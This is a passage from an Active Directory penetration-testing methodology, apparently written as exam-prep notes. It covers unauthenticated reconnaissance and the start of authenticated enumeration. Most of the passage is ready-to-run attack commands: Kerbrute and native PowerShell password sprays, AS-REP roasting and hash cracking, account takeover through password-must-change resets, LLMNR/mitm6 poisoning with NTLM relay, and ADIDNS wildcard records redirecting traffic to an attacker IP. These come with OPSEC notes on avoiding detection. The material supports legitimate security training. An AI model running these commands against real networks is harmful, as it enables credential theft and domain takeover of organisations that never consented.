# Active Directory Penetration Testing Methodology

A dedicated methodology for attacking Active Directory environments. Covers the full chain from unauthenticated enumeration to domain compromise and persistence.

For initial service discovery and port scanning, start with [enumeration-methodology.md](enumeration-methodology.md).
For Windows local attacks (privesc, credential dumping, etc.), see [windows-methodology.md](windows-methodology.md).
For transferring tools to targets (Rubeus, SharpHound, Invoke-BadSuccessor, etc.), see [file-transfers.md](file-transfers.md).
For navigating BloodHound paths and Cypher queries, see [bloodhound-guide.md](bloodhound-guide.md).
For MSF-equivalent modules (auxiliary/admin/kerberos/get_ticket, NTLM relay, payload generation), see [metasploit-framework.md](metasploit-framework.md).

> **OPSEC tags:** 🟢 quiet (low/no detection) · 🟡 logged (volumetric or signature-known) · 🔴 alert-likely (textbook EDR/XDR detection). Untagged = treat as 🟢 by default.

---

## Table of Contents

- [Phase 1: External Reconnaissance (No Credentials)](#phase-1-external-reconnaissance-no-credentials)
- [Phase 2: Authenticated Enumeration](#phase-2-authenticated-enumeration)
- [Phase 3: Credential Attacks](#phase-3-credential-attacks)
  - [3.1 Kerberoasting](#31-kerberoasting)
- [Phase 4: ACL-Based Attacks](#phase-4-acl-based-attacks)
  - [4.1 Attack Matrix](#41-attack-matrix)
- [Phase 5: Delegation Attacks](#phase-5-delegation-attacks)
  - [5.2.5 BronzeBit (CVE-2020-17049)](#525-bronzebit-cve-2020-17049)
  - [5.3 Resource-Based Constrained Delegation (RBCD)](#53-resource-based-constrained-delegation-rbcd)
- [Phase 6: AD CS (Active Directory Certificate Services) Attacks](#phase-6-ad-cs-active-directory-certificate-services-attacks)
  - [6.2 ESC1 — Misconfigured Certificate Templates](#62-esc1-misconfigured-certificate-templates)
- [Phase 7: Advanced AD CS Attacks](#phase-7-advanced-ad-cs-attacks)
- [Phase 8: GMSA & LAPS Extraction](#phase-8-gmsa--laps-extraction)
- [Phase 9: Trust Attacks](#phase-9-trust-attacks)
- [Phase 10: Domain Compromise](#phase-10-domain-compromise)
  - [10.1 DCSync](#101-dcsync)
  - [10.4b Sapphire Ticket — AES-Forged Golden TGT (Detection Evader)](#104b-sapphire-ticket--aes-forged-golden-tgt-detection-evader)
  - [10.9 krbtgt Rollover Mechanics — Golden Ticket Viability After Reset](#109-krbtgt-rollover-mechanics--golden-ticket-viability-after-reset)
  - [10.10 DCSync via Raw MS-DRSR (EDR Evasion Path)](#1010-dcsync-via-raw-ms-drsr-edr-evasion-path)
- [Phase 11: Coercion Attacks](#phase-11-coercion-attacks)
  - [11.0 Coerce → Relay → Result Decision Table](#110-coerce--relay--result-decision-table)
- [Phase 12: Exchange / Mail Server Attacks](#phase-12-exchange--mail-server-attacks)
- [Phase 13: SCCM / MECM Attacks](#phase-13-sccm--mecm-attacks)
- [Phase 14: WSUS Attacks](#phase-14-wsus-attacks)

**Decision Tables & Quick References** (highest-density mid-engagement reference content):

- [Quick Reference: "I Have Creds — What Now?" (AD Flow)](#quick-reference-i-have-creds--what-now-ad-flow)
- [Quick Reference: BloodHound Edge → Action](#quick-reference-bloodhound-edge--action)
- [Quick Reference: Common Attack Chains](#quick-reference-common-attack-chains)
- [Quick Reference: Hashcat Modes for AD Hashes](#quick-reference-hashcat-modes-for-ad-hashes)
- [Quick Reference: AD Tool Cheatsheet](#quick-reference-ad-tool-cheatsheet)
- [Quick Reference: Common AD Misconfigurations to Check](#quick-reference-common-ad-misconfigurations-to-check)
- [Quick Reference: Metasploit Modules for AD/Windows](#quick-reference-metasploit-modules-for-adwindows)
- [LOTL Quick Reference](#lotl-quick-reference)

> Note: subsection numbers `Nb` / `Nc` (e.g. 2.4b, 6.2b, 6.2c, 11.5b) are LOTL alternates inserted next to their primary technique without renumbering siblings. Phase 7 ESC numbers reflect upstream taxonomy ordering, not file order — see the 7.X mapping in 6.1 enumeration table.

---

## Phase 1: External Reconnaissance (No Credentials)

**Goal:** Enumerate the domain and harvest initial credentials without valid authentication.

### 1.0 Kerberos Clock Sync (Do This First)
Kerberos requires clocks to be within 5 minutes of the DC. If your clock is off, impacket, certipy, Rubeus, and any Kerberos-based attack will fail with `KRB_AP_ERR_SKEW`.

```bash
# Check DC time
nmap -sV -p 88 <DC_IP> 2>/dev/null | grep "clock-skew"
# Or via SMB:
netexec smb <DC_IP> 2>/dev/null | grep "clock"

# Sync your clock to the DC (pick one method)
# Method 1: ntpdate (may need install: sudo apt install ntpdate)
sudo ntpdate <DC_IP>

# Method 2: ntpdig (modern replacement, part of ntpsec — available on newer Kali)
sudo ntpdig <DC_IP>

# Method 3: Manual set (if neither ntpdate nor ntpdig available)
# Get DC time from nmap clock-skew output, then:
sudo timedatectl set-ntp false
sudo date -s "<DC_TIME>"

# Method 4: faketime (run a single command with offset, doesn't change system clock)
# Install: sudo apt install faketime
faketime -f '+2h' impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request

# Verify sync
date
# Should be within 5 minutes of DC time
```

> Run `sudo ntpdate <DC_IP>` (or `sudo ntpdig <DC_IP>`) at the start of every engagement and again after any VM revert/snapshot restore.

### 1.0.5 NTLM-Disabled DC — Detect & Pivot to Kerberos-Only

Modern hardened DCs may disable NTLM entirely (Group Policy: *Network security: Restrict NTLM: NTLM authentication in this domain* = Deny all). Standard tools fail with auth errors that look like wrong password. Detect first, then force every tool to Kerberos.

**Detection signals (you will see one of these when NTLM is off):**

| Tool | Signal in output |
|---|---|
| `nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>'` | `STATUS_NOT_SUPPORTED` or `NTLM:False` in the banner line |
| `nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --gen-relay-list /dev/null` | "NTLM authentication is disabled" |
| `impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>` | `KDC_ERR_PREAUTH_FAILED` *with valid creds* — NTLM blocked, fallback to Kerberos didn't fire |
| `smbclient -L //<DC_IP> -U '<USER>'` | `NT_STATUS_LOGON_FAILURE` despite known-good password |
| `nxc smb <DC_IP> -u '<USER>' -p '<PASSWORD>'` | `STATUS_ACCOUNT_RESTRICTION` — user is in **Protected Users** group (NTLM disabled per-account, not DC-wide) |

> **Heuristic:** known-good creds + `STATUS_NOT_SUPPORTED` on SMB = NTLM disabled DC-wide. Known-good creds + `STATUS_ACCOUNT_RESTRICTION` = user is in the Protected Users security group (NTLM disabled for that principal only). Either way, re-issue every command with `-k` from here on.

**Protected Users differentiation:** `STATUS_ACCOUNT_RESTRICTION` (NTSTATUS `0xC000015B`) is the specific error when the account itself cannot use NTLM — typically because it is a member of the `Protected Users` group (SID `S-1-5-21-<DOMAIN_SID>-525`). Unlike DC-wide NTLM disablement (`STATUS_NOT_SUPPORTED`), other accounts on the same DC still authenticate via NTLM. The pivot is identical — switch to Kerberos — but the root cause matters for understanding which accounts will and won't work with NTLM relay/PtH.

```bash
# Confirm Protected Users membership for a specific account
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' \
    -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=group)(cn=Protected Users))" member

# Or from netexec:
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' \
    --query '(&(objectClass=group)(cn=Protected Users))' member
```

```powershell
# LOTL — check if a specific user is in Protected Users
([adsisearcher]"(&(objectClass=group)(cn=Protected Users))").FindOne().Properties.member |
    Where-Object { $_ -match '<TARGET_USER>' }
```

> **Impact on attack paths:** Protected Users members cannot be targeted with PtH, NTLM relay, or delegation (S4U2Self returns non-forwardable tickets). When impersonating via RBCD/constrained delegation, pick a high-priv user who is NOT in Protected Users.

```bash
# 1. Auto-generate krb5.conf from the DC (NetExec ≥ 1.5.1 required for --generate-krb5-file)
netexec smb <DC_FQDN> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN> -k --generate-krb5-file /tmp/krb5.conf
sudo cp /tmp/krb5.conf /etc/krb5.conf

# 2. Verify clock sync (Kerberos is now mandatory — skew = total auth failure)
sudo ntpdate <DC_IP>

# 3. Add hosts entry — Kerberos requires FQDN, not IP, for SPN matching
echo "<DC_IP> <DC_FQDN> <DOMAIN> <DC_HOSTNAME>" | sudo tee -a /etc/hosts

# 4. Sanity check — request a TGT for your user
impacket-getTGT <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>
export KRB5CCNAME=<USER>.ccache
klist                                       # Should show your TGT
```

**Re-run prior enumeration with `-k` (every tool):**

```bash
# Every nxc / impacket / smbclient / evil-winrm command now requires -k and FQDN (not IP)
nxc smb <DC_FQDN> -u '<USER>' -p '<PASSWORD>' -k --shares
nxc ldap <DC_FQDN> -u '<USER>' -p '<PASSWORD>' -k --users
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -target-domain <DOMAIN> -k -no-pass -request
smbclient //<DC_FQDN>/<SHARE> -k -U '<USER>@<DOMAIN>'
evil-winrm -i <DC_FQDN> -u '<USER>' -r <DOMAIN>          # -r = realm, ccache from KRB5CCNAME
```

> **Common failure modes when going Kerberos-only:**
> - `KRB_AP_ERR_SKEW` → re-sync clock (§1.0)
> - `Server not found in Kerberos database` → using IP instead of FQDN, or `/etc/hosts` not set
> - `KDC_ERR_S_PRINCIPAL_UNKNOWN` → SPN doesn't exist for the service you're hitting (try `cifs/<DC_FQDN>` or `host/<DC_FQDN>` explicitly)
> - `KRB5CCNAME` unset → ticket exists but tools don't see it; `export KRB5CCNAME=<file>.ccache` and re-run

### 1.0.6 SSH via Kerberos GSSAPI (Windows OpenSSH + Linux Hosts)

When a target runs OpenSSH with password authentication disabled but GSSAPI enabled (common on hardened Windows servers and domain-joined Linux hosts), authenticate using a Kerberos TGT. Requires a valid ccache (from getTGT, kinit, or Pass-the-Ticket) and correct `/etc/krb5.conf` (set up in 1.0.5).

**Pre-conditions:**
- Target sshd has `GSSAPIAuthentication yes` in `sshd_config`
- Target host has a `host/<FQDN>` SPN registered in AD
- Your `/etc/krb5.conf` points to the correct KDC (set up in 1.0.5)
- You hold a valid TGT in your ccache (KRB5CCNAME exported)

```bash
# 1. Acquire TGT (if not already cached)
impacket-getTGT '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
export KRB5CCNAME=$(pwd)/<USER>.ccache
klist    # verify TGT is valid and not expired

# 2. SSH with GSSAPI — the -K flag is shorthand for GSSAPIAuthentication=yes
ssh -K <USER>@<TARGET_FQDN>

# Explicit options (when -K alone fails or isn't available):
ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes <USER>@<TARGET_FQDN>

# Delegate credentials to the remote host (enables double-hop from the SSH session)
ssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes <USER>@<TARGET_FQDN>
# On the remote host, `klist` will show the delegated TGT

# 3. If target is Windows OpenSSH — username format may need DOMAIN\USER or user@DOMAIN
ssh -o GSSAPIAuthentication=yes '<DOMAIN>\\<USER>'@<TARGET_FQDN>
ssh -o GSSAPIAuthentication=yes '<USER>@<DOMAIN>'@<TARGET_FQDN>
```

```bash
# Using kinit instead of impacket-getTGT (native MIT Kerberos client)
kinit '<USER>@<REALM>'    # REALM = uppercase DOMAIN (e.g., CORP.LOCAL)
# Enter password at prompt
klist                      # verify TGT
ssh -K <USER>@<TARGET_FQDN>
```

**Troubleshooting:**
```bash
# Debug GSSAPI negotiation failures
ssh -vvv -o GSSAPIAuthentication=yes <USER>@<TARGET_FQDN> 2>&1 | grep -i 'gssapi\|kerberos\|gss'

# Common failures:
# "No Kerberos credentials available" → KRB5CCNAME not set or TGT expired
# "Server not found in Kerberos database" → /etc/hosts missing FQDN, or host/<FQDN> SPN not registered
# "GSSAPI Error: Unspecified GSS failure" → clock skew (re-sync: sudo ntpdate <DC_IP>)
# "Permission denied (publickey,gssapi-with-mic)" → GSSAPI not enabled in target sshd_config
```

#### Living-off-the-land / LOTL variant

```powershell
# From a Windows foothold with a Kerberos ticket cached (runas /netonly or domain-joined):
# Windows native ssh.exe (Win10 1809+) supports GSSAPI natively when domain-joined
ssh.exe -o GSSAPIAuthentication=yes <USER>@<TARGET_FQDN>

# Or with PuTTY (if present): Connection → SSH → Auth → GSSAPI → check "Attempt GSSAPI auth"
# PuTTY uses the Windows SSPI stack (equivalent to GSSAPI) — just needs a TGT in the session
```

```cmd
:: Verify the host SPN exists before attempting GSSAPI (missing SPN = guaranteed failure)
setspn -Q host/<TARGET_FQDN>
:: Or via LDAP from Linux:
:: ldapsearch ... "(servicePrincipalName=host/<TARGET_FQDN>)" sAMAccountName
```

> **When to use this:** Password auth disabled, no SSH keys available, but you have domain creds or a ccache. Common in CPTS lab scenarios where Windows OpenSSH is the only remote-access vector and RDP/WinRM are blocked.

### 1.1 DNS Enumeration
```bash
# Identify domain controllers via DNS
dig SRV _ldap._tcp.dc._msdcs.<DOMAIN> @<DNS_SERVER>
dig SRV _kerberos._tcp.<DOMAIN> @<DNS_SERVER>
nslookup -type=SRV _ldap._tcp.<DOMAIN> <DNS_SERVER>

# Zone transfer
dig axfr @<DC_IP> <DOMAIN>

# Reverse lookups for discovered IPs
dnsrecon -r <SUBNET>/24 -n <DC_IP>
```

### 1.2 Null Session / Anonymous Enumeration
```bash
# SMB null session
netexec smb <DC_IP> -u '' -p '' --shares
netexec smb <DC_IP> -u '' -p '' --users
netexec smb <DC_IP> -u '' -p '' --groups
netexec smb <DC_IP> -u 'guest' -p '' --shares

# RID brute-force (enumerate users via SID cycling)
netexec smb <DC_IP> -u '' -p '' --rid-brute 10000

# RPC null session
rpcclient -U "" -N <DC_IP>
# enumdomusers, enumdomgroups, querydispinfo, querydominfo, enumprinters

# LDAP anonymous bind
ldapsearch -x -H ldap://<DC_IP> -s base namingContexts
ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=person)" sAMAccountName
```

### 1.3 Kerbrute — User Enumeration & Brute-Force
```bash
# https://github.com/ropnop/kerbrute
# Username enumeration (no lockout risk)
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Password spraying via Kerberos
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt 'Welcome1!'

# Brute-force single user
kerbrute bruteuser -d <DOMAIN> --dc <DC_IP> passwords.txt <USERNAME>
```

#### Living-off-the-land equivalent — `runas /netonly` credential validation

When kerbrute is unavailable on a Windows pivot, validate creds in-place by spawning a process with the credential set and inspecting the resulting Kerberos cache. No domain join required.

```cmd
:: Inject credentials into a new process WITHOUT writing them to disk;
:: outbound auth uses the supplied creds, local token unchanged.
runas /netonly /user:<DOMAIN>\<USER> "powershell.exe"

:: In the spawned shell, list cached tickets — if a TGT appears, the password worked.
klist tickets
klist tgt

:: Trigger TGT acquisition by touching any DC service
dir \\<DC_FQDN>\sysvol > nul && klist tickets
```

```powershell
# Validation loop over a userlist (Win10/11, no kerbrute, no AD module)
Get-Content users.txt | ForEach-Object {
    $u = $_
    cmdkey /add:<DC_FQDN> /user:"<DOMAIN>\$u" /pass:'<PASSWORD>' | Out-Null
    $r = net use \\<DC_FQDN>\IPC$ 2>&1
    if ($LASTEXITCODE -eq 0) { "[+] $u"; net use \\<DC_FQDN>\IPC$ /delete | Out-Null }
    cmdkey /delete:<DC_FQDN> | Out-Null
}
```

> **LOTL caveat:** Each failed attempt generates Event 4625 on the DC (logon type 3). Behaves identically to a real spray — respect lockout policy. `runas /netonly` itself is benign and ubiquitous in helpdesk workflows.

### 1.4 AS-REP Roasting (Pre-Auth Disabled)

> For cracking AS-REP hashes (mode 18200), see [password-cracking.md](password-cracking.md) Phase 5.5.
```bash
# Without user list (requires LDAP anonymous bind)
impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -request -format hashcat

# With user list
impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt

# Crack
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

#### Living-off-the-land equivalent — discover AS-REP candidates without Impacket

```powershell
# Native [adsisearcher] — UAC bit DONT_REQUIRE_PREAUTH (0x400000 = 4194304)
# Win7+ / any authenticated domain user. No RSAT, no PowerView.
([adsisearcher]"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))").FindAll() |
    ForEach-Object { $_.Properties.samaccountname }
```

> Feed the resulting users.txt back into `impacket-GetNPUsers` (Linux) or harvest hashes natively via Rubeus `asreproast`. Pure-PowerShell AS-REP harvesting is non-trivial without Add-Type / Rubeus.

### 1.5 Password Spraying
```bash
# SMB spray
netexec smb <DC_IP> -u users.txt -p '<SEASON><YEAR>!' --continue-on-success

# Kerberos spray (stealthier, no logon events on target)
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<SEASON><YEAR>!'

# LDAP spray
netexec ldap <DC_IP> -u users.txt -p '<SEASON><YEAR>!' --continue-on-success

# Common patterns: <SEASON><YEAR>!, Company+123, Welcome1!, Password1, <Company><YEAR>!
```

#### Living-off-the-land equivalent — native Windows spray

When netexec/kerbrute aren't available on a Windows foothold. Always pull the lockout policy first to avoid mass-locking accounts.

```powershell
# 1) Read lockout policy via [adsisearcher] (no RSAT)
$root = [adsisearcher]"(objectClass=domainDNS)"
$root.PropertiesToLoad.AddRange(@('lockoutthreshold','lockoutduration','lockoutobservationwindow'))
$p = $root.FindOne().Properties
"Threshold=$($p.lockoutthreshold) ObservationWindow=$($p.lockoutobservationwindow)"
# threshold 0 = no lockout. Otherwise: stay at threshold-1 attempts per observation window.

# 2) Lockout-aware LDAP-bind spray (one bind per user, no SMB session noise)
$pw = '<PASSWORD>'
Get-Content users.txt | ForEach-Object {
    $u = $_
    try {
        $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://<DC_FQDN>","<DOMAIN>\$u",$pw)
        $null = $de.NativeObject     # forces bind
        "[+] $u : $pw"
    } catch [System.DirectoryServices.DirectoryServicesCOMException] {
        # 0x52e = bad creds, 0x775 = locked, 0x533 = disabled
    }
}
```

```cmd
:: Pure cmd.exe — net use loop with cleanup (noisier; SMB session events 4624/4625)
for /F %u in (users.txt) do @(
    net use \\<DC_FQDN>\IPC$ /user:<DOMAIN>\%u <PASSWORD> 2>nul && (echo [+] %u & net use \\<DC_FQDN>\IPC$ /delete >nul)
)
```

> **OPSEC:** LDAP-bind sprays generate Event 4625 on the DC with `LogonType=3` and `Status=0xC000006A` for bad password. Pace requests under the observation window. Always exclude the `krbtgt` account and any disabled accounts from the userlist.

### 1.5b STATUS_PASSWORD_MUST_CHANGE — Detection & Password Reset via SAMR

During password spraying, `STATUS_PASSWORD_MUST_CHANGE` (NTSTATUS `0xC0000224`) indicates the credentials are valid but the account requires a password change at next logon. This is a free account takeover — you know the current password and can reset it to one you control without any ACL rights (the SAMR protocol permits self-change when the old password is known).

**Detection during spray:**
```bash
# netexec flags this status explicitly in output
netexec smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success 2>&1 | grep -i 'PASSWORD_MUST_CHANGE'
# Output line:  SMB  <IP>  445  <HOST>  [-] <DOMAIN>\<USER>:<PASS> STATUS_PASSWORD_MUST_CHANGE

# impacket tools return: "[-] SMB SessionError: STATUS_PASSWORD_MUST_CHANGE"
# smbclient returns: "NT_STATUS_PASSWORD_MUST_CHANGE"
```

**Reset the password (self-change via SAMR — no special ACLs needed):**
```bash
# Method 1: impacket-changepasswd (direct SAMR self-change)
impacket-changepasswd '<DOMAIN>/<USER>:<OLD_PASSWORD>'@<DC_IP> -newpass '<NEW_PASSWORD>'

# Method 2: smbpasswd (Linux native — simple and reliable)
smbpasswd -r <DC_IP> -U '<USER>'
# Prompts for old password then new password

# Method 3: rpcclient setuserinfo2
rpcclient -U '<DOMAIN>/<USER>%<OLD_PASSWORD>' <DC_IP> -c "setuserinfo2 <USER> 23 '<NEW_PASSWORD>'"
```

```bash
# Verify the new password works
netexec smb <DC_IP> -u '<USER>' -p '<NEW_PASSWORD>'
# Should show [+] (success) instead of STATUS_PASSWORD_MUST_CHANGE
```

#### Living-off-the-land / LOTL variant

```powershell
# From a Windows pivot — native net user password change (SAMR self-change)
net user <USER> <NEW_PASSWORD> /domain

# PowerShell — DirectoryServices self-change (no RSAT)
$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('Domain','<DOMAIN>','<DC_FQDN>')
$u = [System.DirectoryServices.AccountManagement.UserPrincipal]::FindByIdentity($ctx,'<USER>')
$u.ChangePassword('<OLD_PASSWORD>','<NEW_PASSWORD>')
```

```cmd
:: Pure cmd.exe — net user self-change
net use \\<DC_FQDN>\IPC$ /user:<DOMAIN>\<USER> <OLD_PASSWORD>
net user <USER> <NEW_PASSWORD> /domain
```

> **Key distinction from ForceChangePassword (4.6):** ForceChangePassword is an ACL-based right that lets you reset *another user's* password without knowing their current one. STATUS_PASSWORD_MUST_CHANGE is a self-service reset where you *know* the old password and just need to satisfy the "must change at next logon" flag. No special permissions required — any user can change their own password.

> **OPSEC:** Password change generates Event 4723 (self-change) on the DC. This is normal helpdesk activity and typically not alerted on. The real tell is the preceding spray — pace attempts under the observation window.

### 1.6 LLMNR / NBT-NS Poisoning (LAN Access Required)

> **Precondition — when does this work?** You must be on the same Layer-2 broadcast domain as the target. CPTS labs simulate this — your Kali `tun0` is bridged onto the lab segment. Real engagements: only valid if you have LAN access (on-site, VPN-into-LAN, or a beachhead on a domain-joined host with raw-socket capability). If you are remote without LAN, skip to Phase 1.7 (mitm6 / IPv6 takeover, sometimes routable) or Phase 11 (Coercion via SMB share writes).

```bash
# From Linux — Start Responder
sudo responder -I tun0 -rdw

# From Windows — Inveigh (Responder equivalent for Windows footholds)
# https://github.com/Kevin-Robertson/Inveigh
# PowerShell version:
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# C# version (InveighZero — works when PowerShell is restricted):
# https://github.com/Kevin-Robertson/Inveigh (compiled from C# source)
.\Inveigh.exe
# View captured hashes: GET NTLMV2UNIQUE

# Crack NetNTLMv2 hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# NTLM Relay (when SMB signing is disabled on target)
# 1. Check SMB signing
netexec smb <SUBNET>/24 --gen-relay-list relay_targets.txt
# For full SMB signing enumeration, see enumeration-methodology.md Phase 3.8

# 2. Disable SMB/HTTP in Responder.conf, then start relay
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i
# -i = interactive shell, -e = execute command, -c = command
# Can also relay to LDAP, ADCS, etc.
```

### 1.7 IPv6 DNS Takeover (mitm6)
```bash
# If IPv6 is enabled (default on Windows) but no IPv6 DNS server exists,
# mitm6 advertises itself as the IPv6 DNS server → captures NTLM auth

# 1. Run mitm6 (acts as rogue DHCPv6/DNS server)
# https://github.com/dirkjanm/mitm6
sudo mitm6 -d <DOMAIN>

# 2. In parallel, relay captured auth to LDAP (create machine account + RBCD)
impacket-ntlmrelayx -6 -t ldaps://<DC_IP> --delegate-access -smb2support

# 3. Wait for a machine to renew its IPv6 config (or reboot)
# mitm6 captures the auth → ntlmrelayx creates a machine account with RBCD rights
# Then use S4U to impersonate Administrator (see Phase 5.3 RBCD)

# Or relay to ADCS for a certificate:
impacket-ntlmrelayx -6 -t http://<CA_IP>/certsrv/certfnsh.asp --adcs --template 'Machine' -smb2support

# WPAD abuse (Responder or mitm6 serve a malicious WPAD config)
# Responder already handles WPAD by default (-w flag)
# mitm6 can also serve WPAD: sudo mitm6 -d <DOMAIN> --wpad
```

### 1.8 ADIDNS Poisoning
Any authenticated domain user can create ADIDNS records by default. This is more persistent than LLMNR/NBT-NS poisoning because it operates at the DNS level — records survive reboots and affect all clients using the AD-integrated DNS server.

```bash
# Enumerate existing ADIDNS records
# https://github.com/dirkjanm/krbrelayx (includes dnstool.py)
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action query <DC_IP>

# Add a wildcard (*) record — captures ALL unresolved DNS queries in the zone
# This redirects any name that doesn't already have a DNS record to your IP
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action add --data <ATTACKER_IP> <DC_IP>

# Add a specific A record (more targeted, less noisy)
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '<TARGET_HOSTNAME>' --action add --data <ATTACKER_IP> <DC_IP>

# Combine with Responder or Inveigh to capture credentials from redirected traffic
sudo responder -I tun0 -rdw
# Or from Windows foothold:
.\Inveigh.exe

# Cleanup — remove injected record after capturing creds
python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action remove --data <ATTACKER_IP> <DC_IP>
```

> **Key difference from LLMNR/NBT-NS:** ADIDNS poisoning is DNS-level and persistent across reboots. LLMNR/NBT-NS only catches queries while Responder is running and only for hosts on the same broadcast domain. ADIDNS wildcard records affect the entire domain.

[↑ Back to top](#active-directory-penetration-testing-methodology)

---

## Phase 2: Authenticated Enumeration

**Goal:** Map the domain with valid credentials to find escalation paths.

### 2.1 BloodHound — Graph-Based Analysis
> For full Cypher query reference and navigation workflow, see [bloodhound-guide.md](bloodhound-guide.md).

```bash
# Collector from Linux
# https://github.com/dirkjanm/bloodhound.py — CE branch / `bloodhound-ce` PyPI package (NOT legacy bloodhound-python)
bloodhound-ce-python -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all --zip

# With NTLM hash (LDAP signing issues? Use SharpHound on target instead)
bloodhound-ce-python -u '<USER>' --hashes 'aad3b435b51404eeaad3b435b51404ee:<NT>' \
  --auth-method ntlm -ns <DC_IP> -d <DOMAIN> -c all --zip --dns-tcp -dc dc01.<DOMAIN>

# Collector from Windows (avoids LDAP signing/LDAPS issues)
# https://github.com/SpecterOps/BloodHound — SharpHound is in the Collectors folder
.\SharpHound.exe -c All --ZipFilename bh.zip

# Alternative: RustHound-CE — fastest single-static-binary collector, supports NTLM hash auth
# https://github.com/g0h4n/RustHound-CE   (CE-schema fork — emits BloodHound CE JSON)
# Legacy: github.com/NH-RED-TEAM/RustHound emits BH 4.x JSON; do NOT use against BloodHound CE
rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -i <DC_IP> -z         # cleartext
rusthound-ce -d <DOMAIN> -u '<USER>@<DOMAIN>' --hashes 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>' -i <DC_IP> -z   # NTLM hash auth
# Add `-f all` for full collection set (default already collects most edges)

# Start BloodHound CE
# Import zip → Analyze → mark owned principals → run path queries
# Key built-in queries:
# - Shortest path to Domain Admin
# - Kerberoastable accounts
# - AS-REP Roastable accounts
# - Unconstrained delegation computers
# - Principals with DCSync rights
# - Outbound Object Control from owned principals
```

### 2.2 NetExec Enumeration
```bash
# Users
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --users

# Groups
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --groups

# Computers
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --computers

# Password policy (check lockout threshold before spraying!)
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol

# Shares across subnet
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --shares

# Sessions (find where users are logged in)
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --sessions

# Logged-on users
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>' --loggedon-users

# Dump LAPS passwords (if readable)  🟡 emits Event 4662 per object with control-access GUID — Sigma-detected
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --laps

# GPP passwords (Group Policy Preferences)
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password

# List admin access across subnet
netexec smb <SUBNET>/24 -u '<USER>' -p '<PASSWORD>'
# (Pwn3d!) = local admin
```

### 2.3 LDAP Queries
```bash
# Dump all users with descriptions (often contain passwords)
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=user)(description=*))" sAMAccountName description

# Find AS-REP Roastable users
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName

# Find Kerberoastable users
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Find Domain Admins
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=group)(cn=Domain Admins))" member

# Find computers with unconstrained delegation
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName

# Domain trusts
ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=trustedDomain)" cn trustDirection trustType
```

### 2.4 PowerView (On Windows Foothold)
```powershell
# https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
Import-Module .\PowerView.ps1

# Domain info
Get-Domain
Get-DomainController

# Users
Get-DomainUser | select samaccountname,description,memberof
Get-DomainUser -SPN     # Kerberoastable
